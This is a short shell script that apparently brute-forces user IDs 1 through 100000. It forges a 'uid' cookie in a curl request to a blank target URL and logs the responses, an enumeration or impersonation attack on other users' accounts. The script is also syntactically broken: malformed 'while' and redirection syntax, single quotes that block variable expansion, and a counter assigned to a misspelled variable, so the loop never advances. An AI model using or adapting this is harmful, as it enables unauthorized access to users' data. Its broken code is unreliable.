#!/bin/sh
USERID=1
while[$USERID -le 100000]; do
echo -e "$USERID ******\n" >\> results.txt
`curl -v -g \
-H 'Cookie: uid=$USERID; sessid= ' \
-d 'menu='\
-d 'profle='\
-d 'r='\
--url https:// /mapped.txt`
echo -e "*********\n\n" >\>mapped.txt
UserID =`expr $USERID +1`
done 
exit
